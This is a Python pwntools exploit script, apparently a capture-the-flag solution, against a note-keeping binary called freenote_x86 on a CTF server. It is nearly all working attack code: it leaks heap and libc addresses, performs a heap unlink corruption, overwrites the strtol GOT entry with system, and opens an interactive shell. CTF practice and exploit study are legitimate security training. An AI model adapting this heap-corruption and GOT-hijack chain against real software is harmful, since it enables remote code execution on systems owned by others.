#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./freenote_x86")
    elf = ELF("./freenote_x86")
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
else:
    io = remote("pwn2.jarvisoj.com", 9885)
    elf = ELF("./freenote_x86")
    libc = ELF("./libc-2.19.so")

def listPost():
    io.sendlineafter("choice: ", "1")
    
def newPost(content):
    io.sendlineafter("choice: ", "2")
    io.sendlineafter("note: ", str(len(content)))
    io.sendafter("note: ", content)

def editNote(idx, content):
    io.sendlineafter("choice: ", "3")
    io.sendlineafter("number: ", str(idx))
    io.sendlineafter("note: ", str(len(content)))
    io.sendafter("note: ", content)

def delPost(idx):
    io.sendlineafter("choice: ", "4")
    io.sendlineafter("number: ", str(idx))

if __name__ == "__main__":
    for i in xrange(5):
        newPost(str(i) * 0x80)

    delPost(3)
    delPost(1)

    payload = '0' * 0x80 + 'a' * 0x8
    editNote(0, payload)

    success("Step 1: leak heapBase")
    listPost()
    io.recvuntil("a" * 0x8)
    heapBase = u32(io.recv(4)) - 0xdb0
    info("heapBase -> 0x%x" % heapBase)
    chunk0Addr = heapBase + 0x18
    info("chunk0Addr -> 0x%x" % chunk0Addr)
    pause()

    success("Step 2: unlink")
    payload = p32(0x88) + p32(0x80) + p32(chunk0Addr - 0xc) + p32(chunk0Addr - 0x8) + '0' * (0x80 - 4 * 4)
    payload += p32(0x80) + p32(0x88 + 0x88)
    editNote(0, payload)
    delPost(1)
    #  pause()

    success("Step 3: leak libcBase")
    payload = p32(2) + p32(1) + p32(0x88) + p32(chunk0Addr - 0xc)
    payload += p32(1) + p32(0x4) + p32(elf.got["strtol"])
    payload = payload.ljust(0x88, '\x00')
    editNote(0, payload)
    listPost()
    io.recvuntil("0. ")
    io.recvuntil("1. ")
    libcBace = u32(io.recv(4)) - libc.symbols["strtol"]
    info("libcBace -> 0x%x" % libcBace)
    systemAddr = libcBace + libc.symbols["system"]
    pause()

    success("Step 4: hijack & get shell")
    editNote(1, p32(systemAddr))
    io.sendlineafter("choice: ", "$0")

    io.interactive()
    io.close()
